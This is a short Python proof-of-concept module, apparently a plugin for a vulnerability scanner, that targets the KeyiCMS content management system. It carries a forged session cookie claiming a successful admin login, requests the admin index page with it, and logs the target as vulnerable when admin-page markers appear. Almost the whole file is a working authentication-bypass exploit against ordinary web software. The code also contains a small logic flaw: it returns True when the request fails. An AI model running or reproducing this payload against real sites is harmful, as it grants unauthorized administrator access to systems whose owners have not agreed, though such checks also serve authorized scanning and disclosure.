#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

import sys
import requests
from module.log import logger


description = 'KeyiCMS login in by Cookie whithout auth'
type = 'site'
cmsname = 'keyicms'

class poc(object):
    
    def __init__(self, v):
    
        self.payload = "ASPSESSIONIDSATDDSRR=LBIFPODBGDIKCHLMLINLNCGO; \
                CompanyZY=LoginIP=192%2E168%2E90%2E1&AdminLoginCode=keyicms&LoginSystem=Succeed&AdminPurview=123&AdminName=123"
        self.path = '/Keyicms_System/Keyicms_Index.Asp?AdminAction=login'
        self.logger = logger(v)
    
    def exploit(self, target):
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)','Cookie': self.payload}
        try:
            res = requests.get(target+self.path, headers=headers, timeout=30)
            if not res.ok:
                return True
            data = res.content
            if 'location.replace(\'Keyicms_Login.Asp\')' in data and 'href="Ky_Admin.Asp"' in data:
                self.logger.log(41,str([target]))
        except Exception as e:
            self.logger.debug(str(e))

    

   



